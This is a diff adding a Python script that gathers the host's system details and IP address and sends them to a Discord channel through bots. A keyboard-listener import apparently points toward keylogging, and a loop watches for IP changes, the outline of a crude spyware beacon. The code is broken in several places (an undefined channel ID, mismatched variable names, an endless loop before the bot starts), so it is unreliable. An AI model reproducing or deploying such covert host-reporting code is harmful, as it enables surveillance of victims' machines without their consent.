@@ -1,0 +1,133 @@
+import socket
+import discord
+from discord.ext import commands
+from pynput import keyboard
+from threading import Thread
+import time
+import platform
+
+print("="*40, "System Information", "="*40)
+uname = platform.uname()
+print(f"System: {uname.system}")
+print(f"Node Name: {uname.node}")
+print(f"Release: {uname.release}")
+print(f"Version: {uname.version}")
+print(f"Machine: {uname.machine}")
+print(f"Processor: {uname.processor}")
+
+
+#send all the info
+
+
+intents = discord.Intents.default()
+intents.message_content = True
+
+
+bot = commands.Bot(command_prefix='>', intents=intents)
+
+@bot.command()
+async def info(ctx):
+    await ctx.send(uname.system)
+    await ctx.send(uname.node)
+    await ctx.send(uname.release)
+    await ctx.send(uname.version)
+    await ctx.send(uname.machine)
+    await ctx.send(uname.processor)
+#############################
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+CHANNEL_ID = ABC
+Message = 'jo im a bot'
+intents = discord.Intents.default()
+intents.message_content = True
+client = commands.Bot(
+    command_prefix=commands.when_mentioned,
+    help_command=None,
+    AllowedMentions=discord.AllowedMentions.none(),
+    intents=intents
+)
+
+@client.event
+async def on_ready():
+    global CHANNEL_ID, MESSAGE
+    channel = client.get_channel(CHANNEL_ID)
+    await channel.send(MESSAGE)
+
+on_ready
+
+    
+def get_ip_address():
+    try:
+        # Create a socket to get the local machine's IP address
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))  # Connecting to Google's public DNS server
+        ip_address = s.getsockname()[0]
+        s.close()
+        return ip_address
+    except socket.error as e:
+        print("Error:", e)
+        return None
+
+if __name__ == "__main__":
+    ip_address = get_ip_address()
+    if ip_address:
+        print("Your IP address is:", ip_address)
+    else:
+        print("Failed to retrieve IP address.")
+while 1 == 1:
+    time.sleep(3)
+
+
+    def get_ip_address2():
+        try:
+         # Create a socket to get the local machine's IP address
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.connect(("8.8.8.8", 80))  # Connecting to Google's public DNS server
+            ip_address2 = s.getsockname()[0]
+            s.close()
+            return ip_address2
+        except socket.error as e:
+            print("Error:", e)
+            return None
+
+    if __name__ == "__main__":
+        ip_address2 = get_ip_address()
+        if ip_address2:
+            print("Your IP address is:", ip_address2)
+        else:
+            print("Failed to retrieve IP address.")
+    if ip_address2 == ip_address:
+        print('')
+        
+    else:
+        
+        @client.event
+        async def on_ready():
+            global CHANNEL_ID, MESSAGE
+            channel = client.get_channel(CHANNEL_ID)
+            await channel.send(MESSAGE)
+           
+
+bot.run('ABC')    
